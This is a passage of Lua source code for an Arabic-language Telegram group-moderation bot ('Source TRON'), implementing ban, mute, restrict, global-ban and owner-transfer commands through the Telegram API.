if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"⌁︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","⌁︙تم طرده من المجموعه")  
end,nil)
end
end
end 
--     Source TRON     --
--          Ban           --
if Admin(msg) then
if text ==('حضر') or text ==('حظر') and ChCheck(msg) then
function BanReply(extra, result, success)
if not Constructor(msg) and DevAbd:get(TRON.."Abd:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع حظر ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"⌁︙لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevAbd:sadd(TRON..'Abd:Ban:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم حظره من المجموعه") 
end,nil) 
end 
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanReply)
end end
if text and (text:match('^حضر @(.*)') or text:match('^حظر @(.*)')) and ChCheck(msg) then
local username = text:match('^حضر @(.*)') or text:match('^حظر @(.*)')
function BanUser(extra,result,success)
if not Constructor(msg) and DevAbd:get(TRON.."Abd:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع حظر ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"⌁︙لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
DevAbd:sadd(TRON..'Abd:Ban:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم حظره من المجموعه")  
end,nil) 
end
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,BanUser)
end
if text and (text:match('^حضر (%d+)') or text:match('^حظر (%d+)')) and ChCheck(msg) then
local user = text:match('حضر (%d+)') or text:match('حظر (%d+)')
if not Constructor(msg) and DevAbd:get(TRON.."Abd:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع حظر ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"⌁︙لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, user)
DevAbd:sadd(TRON..'Abd:Ban:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","⌁︙تم حظره من المجموعه")  
end,nil) 
end
end
--     Source TRON     --
--         UnBan          --
if text ==('الغاء الحظر') or text ==('الغاء حظر') and ChCheck(msg) then
function UnBanReply(extra, result, success)
DevAbd:srem(TRON..'Abd:Ban:'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم الغاء حظره من المجموعه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnBanReply)
end end
if text and (text:match('^الغاء الحظر @(.*)') or text:match('^الغاء حظر @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء الحظر @(.*)') or text:match('^الغاء حظر @(.*)')
function UnBanUser(extra,result,success)
if result.id_ then
DevAbd:srem(TRON..'Abd:Ban:'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.id_,"Reply","⌁︙تم الغاء حظره من المجموعه")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnBanUser)
end
if text and (text:match('^الغاء الحظر (%d+)') or text:match('^الغاء حظر (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء الحظر (%d+)') or text:match('الغاء حظر (%d+)')
DevAbd:srem(TRON..'Abd:Ban:'..msg.chat_id_, user)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = user, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,user,"Reply","⌁︙تم الغاء حظره من المجموعه")  
end 
end 
--     Source TRON     --
--          Mute          --
if Admin(msg) then
if text ==('كتم') and ChCheck(msg) then
function MuteReply(extra, result, success)
if not Constructor(msg) and DevAbd:get(TRON.."Abd:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع كتم ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
if DevAbd:sismember(TRON..'Abd:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙هو بالفعل مكتوم من المجموعه")  
else
DevAbd:sadd(TRON..'Abd:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم كتمه من المجموعه")  
end 
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteReply)
end end
if text and text:match('^كتم @(.*)') and ChCheck(msg) then
local username = text:match('^كتم @(.*)')
function MuteUser(extra,result,success)
if not Constructor(msg) and DevAbd:get(TRON.."Abd:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع كتم ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
if DevAbd:sismember(TRON..'Abd:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","⌁︙هو بالفعل مكتوم من المجموعه")  
else
DevAbd:sadd(TRON..'Abd:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم كتمه من المجموعه")  
end
end
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,MuteUser)
end
if text and text:match('^كتم (%d+)') and ChCheck(msg) then
local user = text:match('كتم (%d+)')
if not Constructor(msg) and DevAbd:get(TRON.."Abd:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع كتم ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
if DevAbd:sismember(TRON..'Abd:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","⌁︙هو بالفعل مكتوم من المجموعه")  
else
DevAbd:sadd(TRON..'Abd:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","⌁︙تم كتمه من المجموعه")  
end
end
end
--     Source TRON     --
--         UnMute         --
if text ==('الغاء الكتم') or text ==('الغاء كتم') and ChCheck(msg) then
function UnMuteReply(extra, result, success)
if not DevAbd:sismember(TRON..'Abd:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙هو ليس مكتوم لالغاء كتمه")  
else
DevAbd:srem(TRON..'Abd:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم الغاء كتمه من المجموعه")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnMuteReply)
end end
if text and (text:match('^الغاء الكتم @(.*)') or text:match('^الغاء كتم @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء الكتم @(.*)') or text:match('^الغاء كتم @(.*)')
function UnMuteUser(extra,result,success)
if result.id_ then
if not DevAbd:sismember(TRON..'Abd:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","⌁︙هو ليس مكتوم لالغاء كتمه")  
else
DevAbd:srem(TRON..'Abd:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم الغاء كتمه من المجموعه")  
end
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnMuteUser)
end
if text and (text:match('^الغاء الكتم (%d+)') or text:match('^الغاء كتم (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء الكتم (%d+)') or text:match('الغاء كتم (%d+)')
if not DevAbd:sismember(TRON..'Abd:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","⌁︙هو ليس مكتوم لالغاء كتمه")  
else
DevAbd:srem(TRON..'Abd:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","⌁︙تم الغاء كتمه من المجموعه")  
end
end 
end 
--     Source TRON     --
--          Tkeed           --
if Admin(msg) then
if text ==('تقييد') or text ==('تقيد') and ChCheck(msg) then
function TkeedReply(extra, result, success)
if not Constructor(msg) and DevAbd:get(TRON.."Abd:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
DevAbd:sadd(TRON..'Abd:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تقيده من المجموعه")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),TkeedReply)
end end
if text and (text:match('^تقييد @(.*)') or text:match('^تقيد @(.*)')) and ChCheck(msg) then
local username = text:match('^تقييد @(.*)') or text:match('^تقيد @(.*)')
function TkeedUser(extra,result,success)
if not Constructor(msg) and DevAbd:get(TRON.."Abd:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقيد ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
DevAbd:sadd(TRON..'Abd:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تقيده من المجموعه")  
end
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,TkeedUser)
end
if text and (text:match('^تقييد (%d+)') or text:match('^تقيد (%d+)')) and ChCheck(msg) then
local user = text:match('تقييد (%d+)') or text:match('تقيد (%d+)')
if not Constructor(msg) and DevAbd:get(TRON.."Abd:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقيد ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user)
DevAbd:sadd(TRON..'Abd:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","⌁︙تم تقيده من المجموعه")  
end
end
--     Source TRON     --
--         UnTkeed          --
if text ==('الغاء تقييد') or text ==('الغاء تقيد') and ChCheck(msg) then
function UnTkeedReply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevAbd:srem(TRON..'Abd:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم الغاء تقيده من المجموعه")  
end
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnTkeedReply)
end end
if text and (text:match('^الغاء تقييد @(.*)') or text:match('^الغاء تقيد @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء تقييد @(.*)') or text:match('^الغاء تقيد @(.*)')
function UnTkeedUser(extra,result,success)
if result.id_ then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevAbd:srem(TRON..'Abd:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم الغاء تقيده من المجموعه")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnTkeedUser)
end
if text and (text:match('^الغاء تقييد (%d+)') or text:match('^الغاء تقيد (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء تقييد (%d+)') or text:match('الغاء تقيد (%d+)')
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevAbd:srem(TRON..'Abd:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","⌁︙تم الغاء تقيده من المجموعه")  
end
end 
end
--     Source TRON     --
--         BanAll         --
if SecondSudo(msg) then
if text ==('حضر عام') or text ==('حظر عام') then
function BanAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(TRON) then  
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevAbd:sismember(TRON..'Abd:SecondSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الثانوي*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevAbd:sadd(TRON..'Abd:BanAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم حظره عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanAllReply)
end end
if text and (text:match('^حضر عام @(.*)') or text:match('^حظر عام @(.*)')) then
local username = text:match('^حضر عام @(.*)') or text:match('^حظر عام @(.*)')
function BanAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(TRON) then  
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevAbd:sismember(TRON..'Abd:SecondSudo:',result.id_) and not Sudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الثانوي*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
DevAbd:sadd(TRON..'Abd:BanAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم حظره عام من المجموعات")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,BanAllUser)
end
if text and (text:match('^حضر عام (%d+)') or text:match('^حظر عام (%d+)')) then
local user = text:match('حضر عام (%d+)') or text:match('حظر عام (%d+)')
if tonumber(user) == tonumber(TRON) then  
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(tonumber(user)) == true then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevAbd:sismember(TRON..'Abd:SecondSudo:',user) and not Sudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الثانوي*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
DevAbd:sadd(TRON..'Abd:BanAll:', user)
ReplyStatus(msg,user,"Reply","⌁︙تم حظره عام من المجموعات")  
end
--     Source TRON     --
--         MuteAll        --
if text ==('كتم عام') then
function MuteAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(TRON) then  
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevAbd:sismember(TRON..'Abd:SecondSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الثانوي*", 1, 'md')
return false 
end
DevAbd:sadd(TRON..'Abd:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم كتمه عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteAllReply)
end end
if text and text:match('^كتم عام @(.*)') then
local username = text:match('^كتم عام @(.*)')
function MuteAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(TRON) then  
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevAbd:sismember(TRON..'Abd:SecondSudo:',result.id_) and not Sudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الثانوي*", 1, 'md')
return false 
end
if result.id_ then
DevAbd:sadd(TRON..'Abd:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم كتمه عام من المجموعات")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,MuteAllUser)
end
if text and text:match('^كتم عام (%d+)') then
local user = text:match('كتم عام (%d+)')
if tonumber(user) == tonumber(TRON) then  
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(tonumber(user)) == true then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevAbd:sismember(TRON..'Abd:SecondSudo:',user) and not Sudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الثانوي*", 1, 'md')
return false 
end
DevAbd:sadd(TRON..'Abd:MuteAll:', user)
ReplyStatus(msg,user,"Reply","⌁︙تم كتمه عام من المجموعات")  
end
--     Source TRON     --
--         UnAll          --
if text ==('الغاء عام') or text ==('الغاء العام') then
function UnAllReply(extra, result, success)
DevAbd:srem(TRON..'Abd:BanAll:', result.sender_user_id_)
DevAbd:srem(TRON..'Abd:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnAllReply)
end end
if text and (text:match('^الغاء عام @(.*)') or text:match('^الغاء العام @(.*)')) then
local username = text:match('^الغاء عام @(.*)') or text:match('^الغاء العام @(.*)')
function UnAllUser(extra,result,success)
if result.id_ then
DevAbd:srem(TRON..'Abd:BanAll:', result.id_)
DevAbd:srem(TRON..'Abd:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnAllUser)
end
if text and (text:match('^الغاء عام (%d+)') or text:match('^الغاء العام (%d+)')) then
local user = text:match('الغاء عام (%d+)') or text:match('الغاء العام (%d+)')
DevAbd:srem(TRON..'Abd:BanAll:', user)
DevAbd:srem(TRON..'Abd:MuteAll:', user)
ReplyStatus(msg,user,"Reply","⌁︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
end
end
end
--     Source TRON     --
if (text == "تغير المطور الاساسي" or text == "نقل ملكيه البوت" or text == "تغيير المطور الاساسي" or text == "↫ تغير المطور الاساسي ⌁") and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
send(msg.chat_id_, msg.id_,'⌁︙يجب التاكد ان المطور الجديد ارسل start لخاص البوت بعد ذلك يمكنك ارسال ايدي المطور')
DevAbd:setex(TRON.."Abd:EditDev"..msg.sender_user_id_,300,true)
end
if DevAbd:get(TRON.."Abd:EditDev"..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,'⌁︙تم الغاء امر تغير المطور الاساسي')
DevAbd:del(TRON.."Abd:EditDev"..msg.sender_user_id_)
return false
end
if text and text:match("^(%d+)$") then 
tdcli_function ({ID = "GetUser",user_id_ = text},function(arg,dp) 
if dp.first_name_ ~= false then
DevAbd:del(TRON.."Abd:EditDev"..msg.sender_user_id_)
DevAbd:set(TRON.."Abd:NewDev"..msg.sender_user_id_,dp.id_)
if dp.username_ ~= false then DevUser = '\n⌁︙المعرف ↫ [@'..dp.username_..']' else DevUser = '' end
local Text = '⌁︙الايدي ↫ '..dp.id_..DevUser..'\n⌁︙الاسم ↫ ['..dp.first_name_..'](tg://user?id='..dp.id_..')\n⌁︙تم حفظ المعلومات بنجاح\n⌁︙استخدم الازرار للتاكيد ↫ ⤈'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/setyes"},{text="لا",callback_data="/setno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,"⌁︙المعلومات خاطئه قم بالتاكد واعد المحاوله")
DevAbd:del(TRON.."Abd:EditDev"..msg.sender_user_id_)
end
end,nil)
return false
end
end
--     Source TRON     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع مطي$") and not DevAbd:get(TRON..'Abd:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if DevAbd:sismember(TRON..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙هو مطي شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المطايه") 
DevAbd:sadd(TRON..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source TRON     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل مطي$") and not DevAbd:get(TRON..'Abd:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if not DevAbd:sismember(TRON..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙هو ليس مطي ليتم تنزيله") 
else
DevAbd:srem(TRON..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المطايه") 
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source TRON     --
if Admin(msg) then
if text and (text:match('^تقييد دقيقه (%d+)$') or text:match('^كتم دقيقه (%d+)$') or text:match('^تقيد دقيقه (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد دقيقه (%d+)$') or text:match('^كتم دقيقه (%d+)$') or text:match('^تقيد دقيقه (%d+)$')
local Minutes = string.gsub(mutept, 'm', '')
local num1 = tonumber(Minutes) * 60 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تقيده لمدة ↫ "..mutept.." د") 
DevAbd:sadd(TRON..'Abd:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end 
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end
if text and (text:match('^تقييد ساعه (%d+)$') or text:match('^كتم ساعه (%d+)$') or text:match('^تقيد ساعه (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد ساعه (%d+)$') or text:match('^كتم ساعه (%d+)$') or text:match('^تقيد ساعه (%d+)$')
local hour = string.gsub(mutept, 'h', '')
local num1 = tonumber(hour) * 3600 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
